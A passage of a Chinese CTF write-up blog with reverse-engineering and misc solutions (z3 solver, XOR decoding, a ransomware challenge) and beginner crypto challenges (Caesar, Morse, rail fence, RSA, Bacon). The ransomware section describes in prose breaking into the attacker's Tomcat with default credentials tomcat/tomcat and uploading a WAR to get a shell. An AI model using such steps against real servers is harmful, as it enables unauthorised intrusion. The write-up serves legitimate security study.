42 * v63 + 72 * v66)solver.add(target[20] == 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66)solver.add(target[21] == 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73)solver.add(target[22] == 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73)solver.add(target[23] == 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73)solver.add(target[24] == 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73)solver.add(target[25] == 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73)solver.add(target[26] == 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73)solver.add(target[27] == 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73)solver.add(target[28] == 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80)solver.add(target[29] == 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80)solver.add(target[30] == 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80)solver.add(target[31] == 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80)solver.add(target[32] == 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80)solver.add(target[33] == 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80)solver.add(target[34] == 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80)solver.add(target[35] == 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87)solver.add(target[36] == 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87)solver.add(target[37] == 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87)solver.add(target[38] == 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87)solver.add(target[39] == 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87)solver.add(target[40] == 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87)solver.add(target[41] == 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87)while (solver.check() == sat):   flag = &quot;&quot;   model = solver.model()   for i in range(42):       flag += chr(model[v[i]].as_long())   print(flag)   solver.add(RecurOr(v, model))# flag&#123;7e171d43-63b9-4e18-990e-6e14c2afe648&#125;</code></pre><h2 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h2><p>输入长度为42位的flag，然后创建了新的线程，里面对输入进行了处理，还有反调试，最后进行比较</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821091520232.png" alt="image-20200821091520232"></p><p>处理过程有一些花指令，去了花指令之后可以看到处理的过程</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092126482.png" alt="image-20200821092126482"></p><p>取出其中一位，右移两位和左移六位之后的结果进行异或，然后再异或0x23</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092313770.png" alt="image-20200821092313770"></p><p>出来的结果加上0x23</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092356200.png" alt="image-20200821092356200"></p><p>索引加一，移向下一位，直接上脚本</p><pre><code class="python">target = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E,0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91,0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]for i in range(len(target)):   target[i] = ((target[i] - 0x23) &amp; 0xff) ^ 0x23   target[i] = ((target[i] &lt;&lt; 2) | (target[i] &gt;&gt; 6)) &amp; 0xff# print(target)flag = &quot;&quot;for i in target:   flag += chr(i)print(flag)# flag&#123;a959951b-76ca-4784-add7-93583251ca92&#125;</code></pre><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h2><p>diskgenius挂载虚拟磁盘disk_dump，恢复被删除数据</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093045254.png" alt="image-20200821093045254"><br>恢复出了被删除的文件，但是是乱码，打开demo发现文件头elf，这个程序对flag文件进行了处理<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093316861.png" alt="image-20200821093316861"></p><p>上脚本逆向处理一下</p><pre><code class="python">v4 = 34v5 = 0target = [0x44, 0x2A, 0x03, 0xE5, 0x29, 0xA3, 0xAF, 0x62, 0x05, 0x31, 0x4E, 0xF3, 0xD6, 0xEB, 0x90, 0x66,0x24, 0x5C, 0xB7, 0x92, 0xF6, 0xD7, 0x4D, 0x0B, 0x6A, 0x41, 0xA3, 0x85, 0xEF, 0x90, 0x5A, 0x7E,0x5B, 0xEC, 0xC1, 0xF0, 0xD4, 0x61, 0x12, 0x12, 0x45, 0xEB, 0xB8]flag = &quot;&quot;for i in target:   v6 = i   flag += chr(((v6 ^ v4) - v5) &amp;amp; 0xff)   v4 += 34   v5 = (v5 + 2) &amp;amp; 0xFprint(flag)# flag&#123;e5d7c4ed-b8f6-4417-8317-b809fc26c047&#125;</code></pre><h2 id="WamaCry1"><a href="#WamaCry1" class="headerlink" title="WamaCry1"></a>WamaCry1</h2><p>简易的勒索病毒，打包处理过，解包之后，查看一下student_unpacked，除了一些根本没用的按钮和输出之外，还调用了son.exe</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093629676.png" alt="image-20200821093629676"></p><p>在解包之后的文件中找到这个程序，分析一下程序逻辑<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093904054.png"></p><p>获取电脑名字，生成公钥和私钥对flag进行加密<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093750996.png" alt="image-20200821093750996"></p><p>连接服务器，ip和端口如图，向服务器发送电脑名和私钥</p><p>得到ip以后扫描端口，发现开放8080是tomcat的默认管理页面，尝试弱口令tomcat/tomcat进去项目管理页面，构造war包上传拿到shell，在/tmp/key/文件夹下发现私钥及勒索病毒服务器端</p><p>在服务器段拿到生成的私钥文件和服务器端运行的程序，查看私钥发现经过了处理，分析服务器端程序，先开放端口建立连接<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821094420639.png" alt="image-20200821094420639"><br>接收先发送的电脑名称，创建以电脑名命名的文件<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821094550871.png" alt="image-20200821094550871"></p><p>rsa私钥有很多行，逐行接收，最关键的处理就是buf和1进行异或，这个异或只影响整数的最后一位，对应转换成的字符串的第一个字符，所以对私钥文件的第一列异或1还原回来</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界_Crypto_wp</title>
      <link href="/2020/05/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto-wp/"/>
      <url>/2020/05/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto-wp/</url>
      
        <content type="html"><![CDATA[<p>开始学<code>Crypto</code>主要有两个原因，第一还是受了最近两场比赛的影响，安恒月赛的时候真就提前<code>ak</code>了<code>re</code>之后看着掉排名，<code>GKCTF</code>也是只上了单榜；第二就是最近做<code>re</code>的时候，经常会做到最后遇到加密算法还是抓瞎，所以开始接触了密码学的东西，拿<code>Crypto</code>练习练习</p><span id="more"></span><h3 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>密文</p><pre><code>Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</code></pre><p>直接<code>base64</code>解一下就出来了</p><pre><code>cyberpeace&#123;Welcome_to_new_World!&#125;</code></pre><h4 id="Caeser"><a href="#Caeser" class="headerlink" title="Caeser"></a>Caeser</h4><p>密文</p><pre><code>oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</code></pre><p>凯撒密码，正好用到之前信安导论的大作业，<code>Rust is the future!</code></p><pre><code class="rust">#![allow(dead_code)]#![allow(unused)]fn encrypt(s: &amp;str,rot: u8) -&gt; String&#123;    let mut s_ret=String::new();    for c in s.chars()&#123;        if  (&#39;a&#39; as u8) &lt;= c as u8 &amp;&amp; (c as u8) &lt;= &#39;z&#39; as u8        &#123;            let mut tmp =(c as u8) -(&#39;a&#39; as u8);            tmp=(26+tmp+rot)%26+&#39;a&#39; as u8;            let ch=tmp as char;            s_ret.push(ch);        &#125;        else if (&#39;A&#39; as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= (&#39;Z&#39; as u8)        &#123;            let mut tmp =(c as u8)-(&#39;A&#39; as u8);            tmp=(26+tmp+rot)%26+&#39;A&#39; as u8;            let ch=tmp as char;            s_ret.push(ch);        &#125;        else &#123;            s_ret.push(c);            continue;        &#125;    &#125;    s_ret&#125;fn decrypt(s: &amp;str,rot: u8) -&gt; String&#123;    let mut s_ret=String::new();    for c in s.chars()&#123;        if  (&#39;a&#39; as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= (&#39;z&#39; as u8)        &#123;            let mut tmp =(c as u8) -(&#39;a&#39; as u8);            tmp=(26+tmp-rot)%26+&#39;a&#39; as u8;            // plus 26 to avoid &#39;attempt to subtract with overflow&#39; error since u8 is unsigned            let ch=tmp as char;            s_ret.push(ch);        &#125;        else if (&#39;A&#39; as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= (&#39;Z&#39; as u8)        &#123;            let mut tmp =(c as u8)-(&#39;A&#39; as u8);            tmp=(26+tmp-rot)%26+&#39;A&#39; as u8;            // plus 26 to avoid &#39;attempt to subtract with overflow&#39; error since u8 is unsigned            let ch=tmp as char;            s_ret.push(ch);        &#125;        else &#123;            s_ret.push(c);            continue;        &#125;    &#125;    s_ret&#125;fn main() &#123;    let s=decrypt(&quot;oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;&quot;,12);    println!(&quot;&#123;:?&#125;&quot;,s);&#125;</code></pre><p>得到<code>flag</code></p><pre><code>cyberpeace&#123;you_have_learned_caesar_encryption&#125;</code></pre><h4 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h4><p>题目是摩斯密码但是内容全是0和1，所以应该是0对应<code>.</code>，1对应<code>-</code></p><pre><code class="python">CODE = &#123;&#39;A&#39;: &#39;.-&#39;, &#39;B&#39;: &#39;-...&#39;, &#39;C&#39;: &#39;-.-.&#39;,        &#39;D&#39;: &#39;-..&#39;, &#39;E&#39;: &#39;.&#39;, &#39;F&#39;: &#39;..-.&#39;,        &#39;G&#39;: &#39;--.&#39;, &#39;H&#39;: &#39;....&#39;, &#39;I&#39;: &#39;..&#39;,        &#39;J&#39;: &#39;.---&#39;, &#39;K&#39;: &#39;-.-&#39;, &#39;L&#39;: &#39;.-..&#39;,        &#39;M&#39;: &#39;--&#39;, &#39;N&#39;: &#39;-.&#39;, &#39;O&#39;: &#39;---&#39;,        &#39;P&#39;: &#39;.--.&#39;, &#39;Q&#39;: &#39;--.-&#39;, &#39;R&#39;: &#39;.-.&#39;,        &#39;S&#39;: &#39;...&#39;, &#39;T&#39;: &#39;-&#39;, &#39;U&#39;: &#39;..-&#39;,        &#39;V&#39;: &#39;...-&#39;, &#39;W&#39;: &#39;.--&#39;, &#39;X&#39;: &#39;-..-&#39;,        &#39;Y&#39;: &#39;-.--&#39;, &#39;Z&#39;: &#39;--..&#39;,        &#39;0&#39;: &#39;-----&#39;, &#39;1&#39;: &#39;.----&#39;, &#39;2&#39;: &#39;..---&#39;,        &#39;3&#39;: &#39;...--&#39;, &#39;4&#39;: &#39;....-&#39;, &#39;5&#39;: &#39;.....&#39;,        &#39;6&#39;: &#39;-....&#39;, &#39;7&#39;: &#39;--...&#39;, &#39;8&#39;: &#39;---..&#39;,        &#39;9&#39;: &#39;----.&#39;,        &#39;.&#39;: &#39;.-.-.-&#39;, &#39;:&#39;: &#39;---...&#39;, &#39;,&#39;: &#39;--..--&#39;, &#39;;&#39;: &#39;-.-.-.&#39;,        &#39;?&#39;: &#39;..--..&#39;, &#39;=&#39;: &#39;-...-&#39;, &#39;\&#39;&#39;: &#39;.----.&#39;, &#39;/&#39;: &#39;-..-.&#39;,        &#39;!&#39;: &#39;-.-.--&#39;, &#39;-&#39;: &#39;-....-&#39;, &#39;_&#39;: &#39;..--.-&#39;, &#39;&quot;&#39;: &#39;.-..-.&#39;,        &#39;(&#39;: &#39;-.--.&#39;, &#39;)&#39;: &#39;-.--.-&#39;, &#39;$&#39;: &#39;...-..-&#39;, &#39;&amp;&#39;: &#39;.-...&#39;,        &#39;@&#39;: &#39;.--.-.&#39;        &#125;def Decode(str):    Decode_value = CODE.keys()    Decode_key = CODE.values()    Decode_dict = dict(zip(Decode_key, Decode_value))    text =&#39;&#39;    str=str.replace(&#39;0&#39;,&#39;.&#39;)    str=str.replace(&#39;1&#39;,&#39;-&#39;)    # print(str)    msg=str.split(&#39; &#39;)    for s in msg:        if s in Decode_dict.keys():            text+=Decode_dict[s]    return textstr=&#39;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&#39;print(Decode(str).lower())</code></pre><p>得到<code>flag</code></p><pre><code>morsecodeissointeresting</code></pre><h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h4><p>密文</p><pre><code>JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow==</code></pre><p><code>base64</code>解一下</p><pre><code class="html">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</code></pre><p><code>Unicode</code>码，新建一个<code>html</code>写进去，浏览器打开得到</p><pre><code>LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</code></pre><p>接着<code>base64</code></p><pre><code>/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100</code></pre><p>应该是ASCII码，写脚本跑一波</p><pre><code class="python">import base64str=b&quot;LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw&quot;t=base64.b64decode(str).decode().split(&#39;/&#39;)[1:]# print(t)flag=&quot;&quot;.join([chr(int(i)) for i in t])print(flag)</code></pre><p>得到<code>flag</code></p><pre><code>welcometoattackanddefenceworld</code></pre><h4 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h4><p>拿到密文</p><pre><code>8842101220480224404014224202480122</code></pre><p>一串数字，题目提示8个字，看到7个0，猜测0是分隔符，了解以下幂数加密，把每一位加起来得到索引</p><pre><code>WELLDOWN</code></pre><h4 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h4><p>题目提示栅栏密码，key是5，但是解出来发现不对，报读之后才知道还有一种w模式的栅栏密码，网上找了段代码</p><pre><code class="python">def enc(plain, num):    matrix = [([0] * len(plain)) for i in range(num)]    i_s = []    for a in range(num):        i_s.append(a)    for a in range(num - 2, 0, -1):        i_s.append(a)    i_s_len = len(i_s)    i = 0    for c in plain:        matrix[i_s[i % i_s_len]][i] = c        i += 1    encrypted = &#39;&#39;    for i in range(num):        for j in range(len(plain)):            if matrix[i][j]:                encrypted += matrix[i][j]    return encrypteddef dec(encrypted, num):    matrix = [([0] * len(encrypted)) for i in range(num)]    cur = 0    for i in range(num):        if i == 0:            pair = [(num - (i + 1)) * 2 - 1]        elif i == num - 1:            pair = [i * 2 - 1]        else:            pair = [(num - (i + 1)) * 2 - 1, i * 2 - 1]        pair_i = 0        j = i        while True:            if cur &lt; len(encrypted):                matrix[i][j] = encrypted[cur]            cur += 1            j += pair[pair_i % len(pair)] + 1            pair_i += 1            if j &gt;= len(encrypted):                break    i_s = []    for a in range(num):        i_s.append(a)    for a in range(num - 2, 0, -1):        i_s.append(a)    i_s_len = len(i_s)    decrypted = &#39;&#39;    for j in range(len(encrypted)):        decrypted += matrix[i_s[j % i_s_len]][j]    return decryptedencrypted = &#39;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&#39;num = 5print(dec(encrypted, num))</code></pre><p>得到flag</p><pre><code>cyberpeace&#123;railfence_cipher_gogogo&#125;</code></pre><h4 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h4><p>题目描述非常直接</p><pre><code>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d</code></pre><p>甚至不用求解<code>rsa</code>，找到d就可以了</p><pre><code class="python">def gcdext(a, b):    &quot;&quot;&quot;    a: 模的取值    b: 想求逆的值    &quot;&quot;&quot;    if b == 0:        return 1, 0, a    x, y, gcd = gcdext(b, a % b)    return y, x - a // b * y, gcdc = 169169912654178p = 473398607161q = 4511491e = 17n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)print(d)# 125631357777427553</code></pre><h4 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h4><p>拿到一段摩斯密码，解一下</p><pre><code class="python">CODE = &#123;    &#39;A&#39;: &#39;.-&#39;,    &#39;B&#39;: &#39;-...&#39;,    &#39;C&#39;: &#39;-.-.&#39;,    &#39;D&#39;: &#39;-..&#39;,    &#39;E&#39;: &#39;.&#39;,    &#39;F&#39;: &#39;..-.&#39;,    &#39;G&#39;: &#39;--.&#39;,    &#39;H&#39;: &#39;....&#39;,    &#39;I&#39;: &#39;..&#39;,    &#39;J&#39;: &#39;.---&#39;,    &#39;K&#39;: &#39;-.-&#39;,    &#39;L&#39;: &#39;.-..&#39;,    &#39;M&#39;: &#39;--&#39;,    &#39;N&#39;: &#39;-.&#39;,    &#39;O&#39;: &#39;---&#39;,    &#39;P&#39;: &#39;.--.&#39;,    &#39;Q&#39;: &#39;--.-&#39;,    &#39;R&#39;: &#39;.-.&#39;,    &#39;S&#39;: &#39;...&#39;,    &#39;T&#39;: &#39;-&#39;,    &#39;U&#39;: &#39;..-&#39;,    &#39;V&#39;: &#39;...-&#39;,    &#39;W&#39;: &#39;.--&#39;,    &#39;X&#39;: &#39;-..-&#39;,    &#39;Y&#39;: &#39;-.--&#39;,    &#39;Z&#39;: &#39;--..&#39;,    &#39;0&#39;: &#39;-----&#39;,    &#39;1&#39;: &#39;.----&#39;,    &#39;2&#39;: &#39;..---&#39;,    &#39;3&#39;: &#39;...--&#39;,    &#39;4&#39;: &#39;....-&#39;,    &#39;5&#39;: &#39;.....&#39;,    &#39;6&#39;: &#39;-....&#39;,    &#39;7&#39;: &#39;--...&#39;,    &#39;8&#39;: &#39;---..&#39;,    &#39;9&#39;: &#39;----.&#39;,    &#39;.&#39;: &#39;.-.-.-&#39;,    &#39;:&#39;: &#39;---...&#39;,    &#39;,&#39;: &#39;--..--&#39;,    &#39;;&#39;: &#39;-.-.-.&#39;,    &#39;?&#39;: &#39;..--..&#39;,    &#39;=&#39;: &#39;-...-&#39;,    &#39;\&#39;&#39;: &#39;.----.&#39;,    &#39;/&#39;: &#39;-..-.&#39;,    &#39;!&#39;: &#39;-.-.--&#39;,    &#39;-&#39;: &#39;-....-&#39;,    &#39;_&#39;: &#39;..--.-&#39;,    &#39;&quot;&#39;: &#39;.-..-.&#39;,    &#39;(&#39;: &#39;-.--.&#39;,    &#39;)&#39;: &#39;-.--.-&#39;,    &#39;$&#39;: &#39;...-..-&#39;,    &#39;&amp;&#39;: &#39;.-...&#39;,    &#39;@&#39;: &#39;.--.-.&#39;&#125;def Decode(str):    Decode_value = CODE.keys()    Decode_key = CODE.values()    Decode_dict = dict(zip(Decode_key, Decode_value))    text = &#39;&#39;    # print(str)    msg = str.split(&#39;/&#39;)    for s in msg:        if s in Decode_dict.keys():            text += Decode_dict[s]    return textstr = &#39;--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-&#39;print(Decode(str).lower())# may_be_have_another_decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</code></pre><p>这一段ab组成的密文是培根密码，写脚本解一下培根密码</p><pre><code class="python">import res = &#39;aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba&#39;CODE_TABLE = &#123;    &#39;a&#39;: &#39;aaaaa&#39;,    &#39;b&#39;: &#39;aaaab&#39;,    &#39;c&#39;: &#39;aaaba&#39;,    &#39;d&#39;: &#39;aaabb&#39;,    &#39;e&#39;: &#39;aabaa&#39;,    &#39;f&#39;: &#39;aabab&#39;,    &#39;g&#39;: &#39;aabba&#39;,    &#39;h&#39;: &#39;aabbb&#39;,    &#39;i&#39;: &#39;abaaa&#39;,    &#39;j&#39;: &#39;abaab&#39;,    &#39;k&#39;: &#39;ababa&#39;,    &#39;l&#39;: &#39;ababb&#39;,    